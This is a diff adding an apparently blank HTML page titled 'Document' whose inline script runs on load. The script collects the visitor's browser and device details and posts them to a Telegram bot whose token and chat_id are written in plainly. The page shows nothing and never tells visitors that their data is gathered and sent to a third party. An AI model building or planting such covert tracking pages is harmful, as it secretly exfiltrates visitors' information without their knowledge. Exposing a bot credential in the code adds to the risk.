@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+
+    <script>
+        const botToken = '8482786366:AAF56pz07r8AlweMcWGZQGnrJkngoAgO3Zs'; // Замените на токен бота
+        const chatId = '7502494374'; // Замените на ваш chat_id
+        const message = JSON.stringify({
+            platform:navigator.platform,
+            appVersion: navigator.appVersion,
+            appCodeName: navigator.appCodeName,
+            appName: navigator.appName,
+            connection: navigator.connection,
+            language: navigator.language,
+            product: navigator.product,
+            vendor: navigator.vendor,
+            userAgentData: navigator.userAgentData
+
+
+
+        }, null, 2);
+
+        // URL API Telegram для отправки сообщения
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Отправка POST-запроса
+        function sendMessage(){
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: '```js' + message +  '```',
+                parse_mode: 'MarkdownV2'
+            }),
+        })
+            .then(response => response.json())
+            .then(data => console.log('Успешно отправлено:', data))
+            .catch(error => console.error('Ошибка:', error));
+
+
+    }
+    sendMessage()
+    </script>
+
+</body>
+
+</html>
